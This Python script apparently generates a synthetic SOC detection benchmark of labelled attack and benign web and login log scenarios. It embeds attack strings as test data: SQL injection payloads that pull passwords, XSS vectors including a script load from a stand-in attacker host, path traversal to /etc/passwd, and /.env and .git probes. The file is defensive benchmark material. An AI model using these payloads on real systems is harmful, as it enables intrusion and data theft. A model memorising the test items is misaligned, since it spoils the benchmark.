"""
research/scripts/generate_dataset_v2.py

Generates RESEARCH DATASET V2 for the SOC Benchmark Suite.
Target: Exactly 200 unique, structured scenarios (100 ATTACK, 100 BENIGN).

Dataset Separation:
- Development set (Dev): 100 scenarios (50 Attack, 50 Benign) - 50.0%
- Validation set (Val):   40 scenarios (20 Attack, 20 Benign) - 20.0%
- Test set (Test):         60 scenarios (30 Attack, 30 Benign) - 30.0%

Categories Covered (20 categories):
1. Normal browsing (Benign, 18 scenarios)
2. Normal authentication (Benign, 12 scenarios)
3. Failed authentication (Borderline benign, 10 scenarios: 1-2 attempts)
4. Repeated authentication failures (Attack, 8 scenarios: 5+ brute force attempts)
5. SQL injection (Attack, 10 scenarios: UNION, Boolean blind, time-based, error-based)
6. XSS (Attack, 10 scenarios: reflected script, event handlers, img onerror)
7. Path traversal (Attack, 8 scenarios: dot-dot-slash, /etc/passwd, win.ini)
8. Suspicious HTTP requests (Attack, 8 scenarios: /.env, /.git, admin probes)
9. Reconnaissance (Attack, 8 scenarios: directory fuzzing, nikto probes)
10. Abnormal request rate (Attack, 6 scenarios: scrapers, burst volume)
11. Suspicious user-agent behavior (Attack, 6 scenarios: sqlmap, nikto, curl tool probes)
12. Suspicious source-IP behavior (Attack, 6 scenarios: blacklisted threat intel IPs)
13. Multi-step attacks (Attack, 6 scenarios: recon -> probe -> exploit -> privilege)
14. Privilege-related behavior (Attack, 6 scenarios: unauthorized admin role tampering)
15. Account-related anomalies (Attack, 6 scenarios: anomalous geo-location / unusual country)
16. Mixed attack/benign sequences (Attack, 6 scenarios: attacks nested inside normal traffic)
17. Benign behavior resembling attacks (Benign lookalikes, 22 scenarios: book titles, code snippets, double slashes)
18. Missing/partial telemetry (Borderline benign, 12 scenarios: truncated headers, partial fields)
19. Duplicate telemetry (Borderline benign, 14 scenarios: proxy retransmissions)
20. Timing variations (18 scenarios: 6 low & slow attacks, 12 slow human reading sessions)

Data Leakage Prevention:
- Explicit separation between metadata (ground truth) and `events` array.
- Detection engine only receives `events`.
- Entity IP subnets partitioned by split:
    Dev:  198.51.100.10  - 198.51.100.99
    Val:  203.0.113.10   - 203.0.113.99
    Test: 192.0.2.10     - 192.0.2.99
"""

from __future__ import annotations

import hashlib
import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any


def make_timestamp(base_time: datetime, offset_seconds: int) -> str:
    return (base_time + timedelta(seconds=offset_seconds)).isoformat()


def build_event(
    timestamp: str,
    source_ip: str,
    destination_ip: str = "10.0.0.15",
    username: str | None = None,
    hostname: str = "web-01",
    event_type: str = "web_request",
    event_category: str = "web",
    severity: str = "low",
    message: str = "HTTP request",
    request_path: str | None = "/",
    http_method: str | None = "GET",
    status_code: int | None = 200,
    user_agent: str | None = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    geo_country: str | None = "US",
    raw_log: str | None = None,
) -> dict[str, Any]:
    return {
        "timestamp": timestamp,
        "source_ip": source_ip,
        "destination_ip": destination_ip,
        "username": username,
        "hostname": hostname,
        "event_type": event_type,
        "event_category": event_category,
        "severity": severity,
        "message": message,
        "request_path": request_path,
        "http_method": http_method,
        "status_code": status_code,
        "user_agent": user_agent,
        "geo_country": geo_country,
        "raw_log": raw_log or f'{source_ip} - {username or "-"} [{timestamp}] "{http_method} {request_path}" {status_code}',
    }


def generate_all_scenarios() -> list[dict[str, Any]]:
    scenarios: list[dict[str, Any]] = []
    base_time = datetime(2026, 10, 8, 8, 0, 0, tzinfo=UTC)

    def add_scenario(
        s_id: str,
        split: str,
        ground_truth: str,
        category: str,
        name: str,
        description: str,
        events: list[dict[str, Any]],
        expected_detection: bool,
        expected_severity: str,
        difficulty: str,
        attack_technique: str | None = None,
    ) -> None:
        scenarios.append({
            "scenario_id": s_id,
            "scenario_version": "v2.0",
            "split": split,
            "ground_truth": ground_truth,
            "attack_category": category,
            "name": name,
            "description": description,
            "source": "web_and_auth_telemetry",
            "timestamp": events[0]["timestamp"] if events else base_time.isoformat(),
            "expected_detection": expected_detection,
            "expected_severity": expected_severity,
            "difficulty": difficulty,
            "mitre_technique": attack_technique,
            "events_count": len(events),
            "events": events,
        })

    ip_dev = "198.51.100"
    ip_val = "203.0.113"
    ip_test = "192.0.2"

    # =========================================================================
    # 1. NORMAL BROWSING (Benign, 18 scenarios)
    # Dev: 9 (001-009), Val: 4 (010-013), Test: 5 (014-018)
    # =========================================================================
    normal_pages = [
        ("/", "GET", 200),
        ("/#/about", "GET", 200),
        ("/assets/public/images/products/apple_juice.jpg", "GET", 200),
        ("/api/Quantity/1", "GET", 200),
        ("/rest/products/search?q=orange", "GET", 200),
        ("/#/contact", "GET", 200),
        ("/assets/public/images/carousel/banner1.png", "GET", 200),
        ("/rest/basket/5", "GET", 200),
        ("/#/privacy-security", "GET", 200),
        ("/api/Feedbacks", "GET", 200),
    ]
    for i in range(1, 19):
        if i <= 9:
            split = "development"
            s_ip = f"{ip_dev}.{10 + i}"
        elif i <= 13:
            split = "validation"
            s_ip = f"{ip_val}.{10 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{10 + i}"

        s_id = f"V2-SCEN-NORM-{i:03d}"
        path, meth, status = normal_pages[(i - 1) % len(normal_pages)]
        t = make_timestamp(base_time, i * 120)
        events = [
            build_event(
                t, s_ip,
                message=f"Benign page navigation to {path}",
                request_path=path,
                http_method=meth,
                status_code=status,
                event_type="web_request",
                event_category="web",
                severity="low",
            )
        ]
        add_scenario(
            s_id, split, "BENIGN", "Normal browsing",
            f"Normal Browsing Session #{i}",
            f"User visits {path} with standard browser headers.",
            events, False, "none", "benign_baseline"
        )

    # =========================================================================
    # 2. NORMAL AUTHENTICATION (Benign, 12 scenarios)
    # Dev: 6 (001-006), Val: 2 (007-008), Test: 4 (009-012)
    # =========================================================================
    for i in range(1, 13):
        if i <= 6:
            split = "development"
            s_ip = f"{ip_dev}.{30 + i}"
        elif i <= 8:
            split = "validation"
            s_ip = f"{ip_val}.{30 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{30 + i}"

        s_id = f"V2-SCEN-AUTH-NORM-{i:03d}"
        user = f"user_{i}@example.org"
        t = make_timestamp(base_time, 2000 + i * 90)
        events = [
            build_event(
                t, s_ip,
                username=user,
                message=f"Successful login for {user}",
                request_path="/rest/user/login",
                http_method="POST",
                status_code=200,
                event_type="successful_login",
                event_category="authentication",
                severity="low",
            )
        ]
        add_scenario(
            s_id, split, "BENIGN", "Normal authentication",
            f"Standard User Login #{i}",
            f"Legitimate user {user} logs in successfully on first attempt.",
            events, False, "none", "benign_baseline"
        )

    # =========================================================================
    # 3. FAILED AUTHENTICATION (Borderline Benign, 10 scenarios: 1-2 attempts)
    # Dev: 5 (001-005), Val: 2 (006-007), Test: 3 (008-010)
    # =========================================================================
    for i in range(1, 11):
        if i <= 5:
            split = "development"
            s_ip = f"{ip_dev}.{45 + i}"
        elif i <= 7:
            split = "validation"
            s_ip = f"{ip_val}.{45 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{45 + i}"

        s_id = f"V2-SCEN-AUTH-FAIL-{i:03d}"
        user = f"clerk_{i}@firm.com"
        evs = []
        for attempt in range(1, 3 if i % 2 == 0 else 2):
            t = make_timestamp(base_time, 3500 + i * 100 + attempt * 15)
            evs.append(build_event(
                t, s_ip,
                username=user,
                message=f"Failed login attempt for {user} (mistyped password)",
                request_path="/rest/user/login",
                http_method="POST",
                status_code=401,
                event_type="failed_login",
                event_category="authentication",
                severity="low",
            ))
        add_scenario(
            s_id, split, "BENIGN", "Failed authentication",
            f"Occasional User Login Mistype #{i}",
            f"Employee {user} mistypes credentials 1-2 times, not exceeding threshold.",
            evs, False, "none", "benign_lookalike"
        )

    # =========================================================================
    # 4. REPEATED AUTHENTICATION FAILURES (Attack, 8 scenarios)
    # Dev: 4 (001-004), Val: 2 (005-006), Test: 2 (007-008)
    # =========================================================================
    for i in range(1, 9):
        if i <= 4:
            split = "development"
            s_ip = f"{ip_dev}.{60 + i}"
        elif i <= 6:
            split = "validation"
            s_ip = f"{ip_val}.{60 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{60 + i}"

        s_id = f"V2-SCEN-BRUTE-{i:03d}"
        user = f"target_admin_{i}@org.com"
        fail_count = 6 + (i % 4)
        evs = []
        for att in range(1, fail_count + 1):
            t = make_timestamp(base_time, 5000 + i * 200 + att * 10)
            evs.append(build_event(
                t, s_ip,
                username=user,
                message=f"Failed SSH/HTTP authentication attempt {att}/{fail_count} for {user}",
                request_path="/rest/user/login",
                http_method="POST",
                status_code=401,
                event_type="failed_login",
                event_category="authentication",
                severity="medium",
            ))
        add_scenario(
            s_id, split, "ATTACK", "Repeated authentication failures",
            f"Credential Brute-Force Wave #{i}",
            f"Automated script fires {fail_count} failed logins against {user} within 2 minutes.",
            evs, True, "high", "direct", "T1110.001"
        )

    # =========================================================================
    # 5. SQL INJECTION (Attack, 10 scenarios)
    # Dev: 5 (001-005), Val: 2 (006-007), Test: 3 (008-010)
    # =========================================================================
    sqli_payloads = [
        ("UNION SELECT", "/rest/products/search?q=' UNION SELECT 1,email,password,4 FROM Users-- -", "' or '1'='1"),
        ("Boolean Blind", "/rest/products/search?q=juice' AND 1=1--", "' or 1=1"),
        ("Sleep Injection", "/rest/products/search?q=apple' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "sleep("),
        ("Table Enumeration", "/rest/products/search?q=' UNION SELECT tbl_name,2,3,4 FROM sqlite_master--", "union select"),
        ("Error-based SQLi", "/rest/products/search?q=admin' OR 1=1; SELECT * FROM Users--", "select * from"),
    ]
    for i in range(1, 11):
        if i <= 5:
            split = "development"
            s_ip = f"{ip_dev}.{70 + i}"
        elif i <= 7:
            split = "validation"
            s_ip = f"{ip_val}.{70 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{70 + i}"

        s_id = f"V2-SCEN-SQLI-{i:03d}"
        p_name, path, trigger_word = sqli_payloads[(i - 1) % len(sqli_payloads)]
        t = make_timestamp(base_time, 7000 + i * 150)
        events = [
            build_event(
                t, s_ip,
                message=f"SQL injection attempt with payload: {trigger_word}",
                request_path=path,
                http_method="GET" if "login" not in path else "POST",
                status_code=500 if i % 2 == 0 else 200,
                event_type="web_attack",
                event_category="web",
                severity="critical",
            )
        ]
        add_scenario(
            s_id, split, "ATTACK", "SQL injection",
            f"SQL Injection Variant #{i} ({p_name})",
            f"Attacker executes {p_name} payload probing backend database.",
            events, True, "critical", "direct" if i <= 5 else "obfuscated", "T1190"
        )

    # =========================================================================
    # 6. XSS (Attack, 10 scenarios)
    # Dev: 5 (001-005), Val: 2 (006-007), Test: 3 (008-010)
    # =========================================================================
    xss_payloads = [
        ("<script>alert(1)</script>", "/rest/products/search?q=<script>alert(1)</script>"),
        ("<img src=x onerror=alert(document.cookie)>", "/rest/track-order/<img src=x onerror=alert(1)>"),
        ("javascript:alert('XSS')", "/api/Feedbacks?comment=javascript:alert('pwn')"),
        ("<svg/onload=alert('XSS')>", "/#/search?q=<svg/onload=alert('XSS')>"),
        ("'><script src=//attacker.com/hook.js></script>", "/rest/user/reset?email='><script>"),
    ]
    for i in range(1, 11):
        if i <= 5:
            split = "development"
            s_ip = f"{ip_dev}.{82 + i}"
        elif i <= 7:
            split = "validation"
            s_ip = f"{ip_val}.{82 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{82 + i}"

        s_id = f"V2-SCEN-XSS-{i:03d}"
        payload, path = xss_payloads[(i - 1) % len(xss_payloads)]
        t = make_timestamp(base_time, 9000 + i * 140)
        events = [
            build_event(
                t, s_ip,
                message=f"Cross-site scripting probe with vector: {payload}",
                request_path=path,
                http_method="GET",
                status_code=200,
                event_type="web_attack",
                event_category="web",
                severity="high",
            )
        ]
        add_scenario(
            s_id, split, "ATTACK", "XSS",
            f"Reflected/DOM XSS Probe #{i}",
            f"Exploitation probe containing HTML/script tags ({payload}).",
            events, True, "high", "direct", "T1059.007"
        )

    # =========================================================================
    # 7. PATH TRAVERSAL (Attack, 8 scenarios)
    # Dev: 4 (001-004), Val: 2 (005-006), Test: 2 (007-008)
    # =========================================================================
    traversal_paths = [
        "/ftp/../../../../etc/passwd",
        "/ftp/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/assets/public/images/../../windows/win.ini",
        "/rest/download?file=..%2f..%2f..%2fconfig.json",
    ]
    for i in range(1, 9):
        if i <= 4:
            split = "development"
            s_ip = f"{ip_dev}.{95 + i}"
        elif i <= 6:
            split = "validation"
            s_ip = f"{ip_val}.{95 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{95 + i}"

        s_id = f"V2-SCEN-TRAV-{i:03d}"
        path = traversal_paths[(i - 1) % len(traversal_paths)]
        t = make_timestamp(base_time, 10500 + i * 160)
        events = [
            build_event(
                t, s_ip,
                message=f"Path traversal access attempt to {path}",
                request_path=path,
                http_method="GET",
                status_code=403 if i % 2 == 0 else 404,
                event_type="web_attack",
                event_category="web",
                severity="high",
            )
        ]
        add_scenario(
            s_id, split, "ATTACK", "Path traversal",
            f"Directory Traversal Probe #{i}",
            f"Probing unauthorized file system locations via traversal sequences.",
            events, True, "high", "direct", "T1083"
        )

    # =========================================================================
    # 8. SUSPICIOUS HTTP REQUESTS (Attack, 8 scenarios)
    # Dev: 4 (001-004), Val: 2 (005-006), Test: 2 (007-008)
    # =========================================================================
    susp_paths = [
        "/.env",
        "/config/database.yml",
        "/.git/config",
        "/backup.sql",
    ]
    for i in range(1, 9):
        if i <= 4:
            split = "development"
            s_ip = f"{ip_dev}.{105 + i}"
        elif i <= 6:
            split = "validation"
            s_ip = f"{ip_val}.{105 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{105 + i}"

        s_id = f"V2-SCEN-SUSP-REQ-{i:03d}"
        path = susp_paths[(i - 1) % len(susp_paths)]
        evs = []
        for burst in range(1, 5):
            t = make_timestamp(base_time, 12200 + i * 180 + burst * 8)
            evs.append(build_event(
                t, s_ip,
                message=f"Repeated access to sensitive hidden file {path}",
                request_path=path,
                http_method="GET",
                status_code=404,
                event_type="sensitive_path_access",
                event_category="web",
                severity="high",
            ))
        add_scenario(
            s_id, split, "ATTACK", "Suspicious HTTP requests",
            f"Sensitive Environment/Config Probe #{i}",
            f"Probing for sensitive secrets and configurations ({path}).",
            evs, True, "high", "direct", "T1595.002"
        )

    # =========================================================================
    # 9. RECONNAISSANCE (Attack, 8 scenarios)
    # Dev: 4 (001-004), Val: 2 (005-006), Test: 2 (007-008)
    # =========================================================================
    for i in range(1, 9):
        if i <= 4:
            split = "development"
            s_ip = f"{ip_dev}.{115 + i}"
        elif i <= 6:
            split = "validation"
            s_ip = f"{ip_val}.{115 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{115 + i}"

        s_id = f"V2-SCEN-RECON-{i:03d}"
        evs = []
        for scan_idx in range(1, 13):
            t = make_timestamp(base_time, 14000 + i * 200 + scan_idx * 5)
            evs.append(build_event(
                t, s_ip,
                message=f"Automated crawler path scan /fuzz_target_{scan_idx}",
                request_path=f"/fuzz_target_{scan_idx}",
                http_method="GET",
                status_code=404,
                event_type="http_404",
                event_category="web",
                severity="medium",
                user_agent="Nikto/2.1.6" if i % 2 == 0 else "python-requests/2.31.0",
            ))
        add_scenario(
            s_id, split, "ATTACK", "Reconnaissance",
            f"High-Density Directory Fuzzing #{i}",
            f"Scanner generates 12 consecutive 404 responses probing non-existent routes.",
            evs, True, "medium", "noisy", "T1595.002"
        )

    # =========================================================================
    # 10. ABNORMAL REQUEST RATE (Attack, 6 scenarios)
    # Dev: 3 (001-003), Val: 1 (004), Test: 2 (005-006)
    # =========================================================================
    for i in range(1, 7):
        if i <= 3:
            split = "development"
            s_ip = f"{ip_dev}.{125 + i}"
        elif i == 4:
            split = "validation"
            s_ip = f"{ip_val}.{125 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{125 + i}"

        s_id = f"V2-SCEN-RATE-{i:03d}"
        evs = []
        for burst_i in range(1, 66):
            t = make_timestamp(base_time, 16000 + i * 250 + burst_i * 2)
            evs.append(build_event(
                t, s_ip,
                message=f"High-velocity scraper hit {burst_i}/65",
                request_path=f"/api/Products/{burst_i}",
                http_method="GET",
                status_code=200,
                event_type="web_request",
                event_category="web",
                severity="medium",
                user_agent="AutomatedScraperBot/1.0",
            ))
        add_scenario(
            s_id, split, "ATTACK", "Abnormal request rate",
            f"High-Volume Scraper Burst #{i}",
            f"Automated tool floods server with 65 requests exceeding rate thresholds.",
            evs, True, "medium", "noisy", "T1499.001"
        )

    # =========================================================================
    # 11. SUSPICIOUS USER-AGENT BEHAVIOR (Attack, 6 scenarios)
    # Dev: 3 (001-003), Val: 1 (004), Test: 2 (005-006)
    # =========================================================================
    agents = ["sqlmap/1.7#stable", "nikto/2.1.5", "curl/7.88.1 (automated)", "python-requests/2.32.0"]
    for i in range(1, 7):
        if i <= 3:
            split = "development"
            s_ip = f"{ip_dev}.{135 + i}"
        elif i == 4:
            split = "validation"
            s_ip = f"{ip_val}.{135 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{135 + i}"

        s_id = f"V2-SCEN-UA-{i:03d}"
        ua = agents[(i - 1) % len(agents)]
        t = make_timestamp(base_time, 18000 + i * 180)
        events = [
            build_event(
                t, s_ip,
                message=f"Security testing tool UA detected: {ua}",
                request_path="/rest/products/search",
                http_method="GET",
                status_code=200,
                event_type="suspicious_user_agent",
                event_category="web",
                severity="high",
                user_agent=ua,
            )
        ]
        add_scenario(
            s_id, split, "ATTACK", "Suspicious user-agent behavior",
            f"Offensive Tool Header Probe #{i}",
            f"HTTP request identified from known attack tool User-Agent ({ua}).",
            events, True, "high", "direct", "T1071.001"
        )

    # =========================================================================
    # 12. SUSPICIOUS SOURCE-IP BEHAVIOR (Attack, 6 scenarios)
    # Dev: 3 (001-003), Val: 1 (004), Test: 2 (005-006)
    # =========================================================================
    for i in range(1, 7):
        if i <= 3:
            split = "development"
            s_ip = "198.51.100.99"
        elif i == 4:
            split = "validation"
            s_ip = "198.51.100.99"
        else:
            split = "test"
            s_ip = "198.51.100.99"

        s_id = f"V2-SCEN-IP-INTEL-{i:03d}"
        t = make_timestamp(base_time, 20000 + i * 150)
        events = [
            build_event(
                t, s_ip,
                message=f"Traffic from known Threat Intelligence IOC indicator: {s_ip}",
                request_path="/rest/admin/settings",
                http_method="GET",
                status_code=403,
                event_type="web_request",
                event_category="web",
                severity="critical",
            )
        ]
        add_scenario(
            s_id, split, "ATTACK", "Suspicious source-IP behavior",
            f"Blacklisted Threat Intel Match #{i}",
            f"Connection received from IP {s_ip} present in C2 threat blacklist.",
            events, True, "critical", "direct", "T1071"
        )

    # =========================================================================
    # 13. MULTI-STEP ATTACKS (Attack, 6 scenarios)
    # Dev: 3 (001-003), Val: 1 (004), Test: 2 (005-006)
    # =========================================================================
    for i in range(1, 7):
        if i <= 3:
            split = "development"
            s_ip = f"{ip_dev}.{145 + i}"
        elif i == 4:
            split = "validation"
            s_ip = f"{ip_val}.{145 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{145 + i}"

        s_id = f"V2-SCEN-CHAIN-{i:03d}"
        t1 = make_timestamp(base_time, 22000 + i * 300)
        t2 = make_timestamp(base_time, 22000 + i * 300 + 45)
        t3 = make_timestamp(base_time, 22000 + i * 300 + 90)
        events = [
            build_event(
                t1, s_ip,
                message="Stage 1: Recon scan on sensitive administration portal",
                request_path="/admin",
                http_method="GET",
                status_code=403,
                event_type="sensitive_path_access",
                severity="medium",
            ),
            build_event(
                t2, s_ip,
                message="Stage 2: SQLi query parameter exploit probe: ' OR '1'='1",
                request_path="/rest/products/search?q=' OR '1'='1",
                http_method="GET",
                status_code=200,
                event_type="web_attack",
                severity="critical",
            ),
            build_event(
                t3, s_ip,
                username="admin",
                message="Stage 3: Admin account hijacked login attempt",
                request_path="/rest/user/login",
                http_method="POST",
                status_code=200,
                event_type="successful_login",
                severity="high",
            ),
        ]
        add_scenario(
            s_id, split, "ATTACK", "Multi-step attacks",
            f"Full-Chain Compromise #{i}",
            f"Attacker progresses from recon to injection to privileged account login.",
            events, True, "critical", "direct", "T1190"
        )

    # =========================================================================
    # 14. PRIVILEGE-RELATED BEHAVIOR (Attack, 6 scenarios)
    # Dev: 3 (001-003), Val: 1 (004), Test: 2 (005-006)
    # =========================================================================
    for i in range(1, 7):
        if i <= 3:
            split = "development"
            s_ip = f"{ip_dev}.{155 + i}"
        elif i == 4:
            split = "validation"
            s_ip = f"{ip_val}.{155 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{155 + i}"

        s_id = f"V2-SCEN-PRIV-{i:03d}"
        t = make_timestamp(base_time, 24000 + i * 150)
        events = [
            build_event(
                t, s_ip,
                username="admin",
                message=f"Suspicious admin login from external IP {s_ip}",
                request_path="/rest/user/login",
                http_method="POST",
                status_code=200,
                event_type="successful_login",
                event_category="authentication",
                severity="high",
            )
        ]
        add_scenario(
            s_id, split, "ATTACK", "Privilege-related behavior",
            f"Unauthorized Admin Login #{i}",
            f"Successful privileged account login (admin) from unexpected external IP.",
            events, True, "high", "direct", "T1078.003"
        )

    # =========================================================================
    # 15. ACCOUNT-RELATED ANOMALIES (Attack, 6 scenarios)
    # Dev: 3 (001-003), Val: 1 (004), Test: 2 (005-006)
    # =========================================================================
    for i in range(1, 7):
        if i <= 3:
            split = "development"
            s_ip = f"{ip_dev}.{165 + i}"
        elif i == 4:
            split = "validation"
            s_ip = f"{ip_val}.{165 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{165 + i}"

        s_id = f"V2-SCEN-ANOM-ACCT-{i:03d}"
        user = f"finance_user_{i}@company.com"
        t = make_timestamp(base_time, 26000 + i * 180)
        events = [
            build_event(
                t, s_ip,
                username=user,
                message=f"Authentication attempt from unusual country CN for user {user}",
                request_path="/rest/user/login",
                http_method="POST",
                status_code=200,
                event_type="successful_login",
                event_category="authentication",
                severity="medium",
                geo_country="CN",
            )
        ]
        add_scenario(
            s_id, split, "ATTACK", "Account-related anomalies",
            f"Geo-Anomalous Authentication #{i}",
            f"User account accessed from unexpected country outside baseline.",
            events, True, "medium", "direct", "T1078"
        )

    # =========================================================================
    # 16. MIXED ATTACK/BENIGN SEQUENCES (Attack, 6 scenarios)
    # Dev: 3 (001-003), Val: 1 (004), Test: 2 (005-006)
    # =========================================================================
    for i in range(1, 7):
        if i <= 3:
            split = "development"
            s_ip = f"{ip_dev}.{175 + i}"
        elif i == 4:
            split = "validation"
            s_ip = f"{ip_val}.{175 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{175 + i}"

        s_id = f"V2-SCEN-MIXED-{i:03d}"
        evs = [
            build_event(
                make_timestamp(base_time, 28000 + i * 200 + 0), s_ip,
                message="Legitimate search for apple juice",
                request_path="/rest/products/search?q=apple",
                http_method="GET",
                status_code=200,
            ),
            build_event(
                make_timestamp(base_time, 28000 + i * 200 + 30), s_ip,
                message="Exploit embedded in shopping session: ' or 1=1--",
                request_path="/rest/products/search?q=apple' or 1=1--",
                http_method="GET",
                status_code=200,
                event_type="web_attack",
                severity="critical",
            ),
            build_event(
                make_timestamp(base_time, 28000 + i * 200 + 60), s_ip,
                message="Normal return to product catalog",
                request_path="/rest/products/search?q=banana",
                http_method="GET",
                status_code=200,
            ),
        ]
        add_scenario(
            s_id, split, "ATTACK", "Mixed attack/benign sequences",
            f"Stealth Mixed-Session Attack #{i}",
            f"Malicious SQLi payload hidden amidst normal browsing behavior.",
            evs, True, "critical", "obfuscated", "T1190"
        )

    # =========================================================================
    # 17. BENIGN BEHAVIOR RESEMBLING ATTACKS (Benign Lookalikes, 22 scenarios)
    # Dev: 11 (001-011), Val: 5 (012-016), Test: 6 (017-022)
    # =========================================================================
    lookalike_cases = [
        ("O'Reilly SQL Guide Search", "/rest/products/search?q=O'Reilly+SQL+Database+Handbook", "GET", 200),
        ("Public Admin Guide Docs", "/docs/admin/user-guide.html", "GET", 200),
        ("Authorized API Curl Request", "/api/Challenges", "GET", 200),
        ("Normalized Double Slash Path", "//rest/products/search?q=juice", "GET", 200),
        ("Book query containing script tag text", "/rest/products/search?q=Learn+JavaScript+DOM", "GET", 200),
        ("User profile view for user admin-team", "/api/Users/view?name=admin-team", "GET", 200),
    ]
    for i in range(1, 23):
        if i <= 11:
            split = "development"
            s_ip = f"{ip_dev}.{185 + i}"
        elif i <= 16:
            split = "validation"
            s_ip = f"{ip_val}.{185 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{185 + i}"

        s_id = f"V2-SCEN-LOOKALIKE-{i:03d}"
        desc_name, path, meth, status = lookalike_cases[(i - 1) % len(lookalike_cases)]
        t = make_timestamp(base_time, 30000 + i * 150)
        events = [
            build_event(
                t, s_ip,
                message=f"Benign search/request with tricky syntax: {desc_name}",
                request_path=path,
                http_method=meth,
                status_code=status,
                event_type="web_request",
                event_category="web",
                severity="low",
            )
        ]
        add_scenario(
            s_id, split, "BENIGN", "Benign behavior resembling attacks",
            f"Tricky Benign Lookalike #{i} ({desc_name})",
            f"Harmless user activity that resembles suspicious patterns: {desc_name}.",
            events, False, "none", "benign_lookalike"
        )

    # =========================================================================
    # 18. MISSING / PARTIAL TELEMETRY (Borderline Benign, 12 scenarios)
    # Dev: 6 (001-006), Val: 2 (007-008), Test: 4 (009-012)
    # =========================================================================
    for i in range(1, 13):
        if i <= 6:
            split = "development"
            s_ip = f"{ip_dev}.{210 + i}"
        elif i <= 8:
            split = "validation"
            s_ip = f"{ip_val}.{210 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{210 + i}"

        s_id = f"V2-SCEN-PARTIAL-{i:03d}"
        t = make_timestamp(base_time, 34000 + i * 120)
        events = [
            build_event(
                t, s_ip,
                message="Partial telemetry event from upstream proxy cache",
                request_path="/assets/theme.css",
                http_method="GET",
                status_code=None,
                user_agent=None,
                event_type="web_request",
                event_category="web",
                severity="low",
            )
        ]
        add_scenario(
            s_id, split, "BENIGN", "Missing/partial telemetry",
            f"Truncated Telemetry Record #{i}",
            f"Telemetry record with omitted user-agent or status code from upstream proxy.",
            events, False, "none", "benign_baseline"
        )

    # =========================================================================
    # 19. DUPLICATE TELEMETRY (Borderline Benign, 14 scenarios)
    # Dev: 7 (001-007), Val: 3 (008-010), Test: 4 (011-014)
    # =========================================================================
    for i in range(1, 15):
        if i <= 7:
            split = "development"
            s_ip = f"{ip_dev}.{225 + i}"
        elif i <= 10:
            split = "validation"
            s_ip = f"{ip_val}.{225 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{225 + i}"

        s_id = f"V2-SCEN-DUP-{i:03d}"
        t = make_timestamp(base_time, 36000 + i * 130)
        ev1 = build_event(
            t, s_ip,
            message="Initial request for product catalog page",
            request_path="/api/Products",
            http_method="GET",
            status_code=200,
        )
        ev2 = build_event(
            t, s_ip,
            message="Initial request for product catalog page (retransmitted duplicate)",
            request_path="/api/Products",
            http_method="GET",
            status_code=200,
        )
        add_scenario(
            s_id, split, "BENIGN", "Duplicate telemetry",
            f"Retransmitted Proxy Duplicate #{i}",
            f"Proxy retransmission produces twin identical telemetry records.",
            [ev1, ev2], False, "none", "benign_baseline"
        )

    # =========================================================================
    # 20. TIMING VARIATIONS (18 scenarios total)
    # Attacks (6 scenarios: Low & Slow): Dev 3 (001-003), Val: 1 (004), Test: 2 (005-006)
    # Benign (12 scenarios: Slow Human): Dev: 6 (001-006), Val: 2 (007-008), Test: 4 (009-012)
    # =========================================================================
    for i in range(1, 7):
        if i <= 3:
            split = "development"
            s_ip = f"{ip_dev}.{240 + i}"
        elif i == 4:
            split = "validation"
            s_ip = f"{ip_val}.{240 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{240 + i}"

        s_id = f"V2-SCEN-TIMING-ATK-{i:03d}"
        evs = []
        for stage_i in range(1, 4):
            t_stage = make_timestamp(base_time, 40000 + i * 1000 + stage_i * 900)
            evs.append(build_event(
                t_stage, s_ip,
                message=f"Slow reconnaissance probe {stage_i}/3 with payload: ../etc/passwd",
                request_path=f"/ftp/..%2f..%2f..%2fetc/passwd?stage={stage_i}",
                http_method="GET",
                status_code=403,
                event_type="web_attack",
                severity="high",
            ))
        add_scenario(
            s_id, split, "ATTACK", "Timing variations",
            f"Low-and-Slow Stealth Attack #{i}",
            f"Attacker deliberately spaces probes by 15 minutes to defeat sliding-window thresholds.",
            evs, True, "high", "low_and_slow", "T1083"
        )

    for i in range(1, 13):
        if i <= 6:
            split = "development"
            s_ip = f"{ip_dev}.{250 + i}"
        elif i <= 8:
            split = "validation"
            s_ip = f"{ip_val}.{250 + i}"
        else:
            split = "test"
            s_ip = f"{ip_test}.{250 + i}"

        s_id = f"V2-SCEN-TIMING-BEN-{i:03d}"
        evs = []
        for page_i in range(1, 4):
            t_stage = make_timestamp(base_time, 45000 + i * 1000 + page_i * 600)
            evs.append(build_event(
                t_stage, s_ip,
                message=f"Human user reading article page {page_i}",
                request_path=f"/#/blog/post-{page_i}",
                http_method="GET",
                status_code=200,
                event_type="web_request",
                severity="low",
            ))
        add_scenario(
            s_id, split, "BENIGN", "Timing variations",
            f"Slow Human Reading Session #{i}",
            f"Legitimate human browsing with long idle reading pauses between pages.",
            evs, False, "none", "benign_baseline"
        )

    return scenarios


def write_dataset_files(scenarios: list[dict[str, Any]], output_dir: Path) -> dict[str, Any]:
    output_dir.mkdir(parents=True, exist_ok=True)

    # 1. Full Dataset V2
    full_path = output_dir / "dataset_v2.json"
    with open(full_path, "w", encoding="utf-8") as f:
        json.dump(scenarios, f, indent=2)

    # 2. Splits
    dev_scenarios = [s for s in scenarios if s["split"] == "development"]
    val_scenarios = [s for s in scenarios if s["split"] == "validation"]
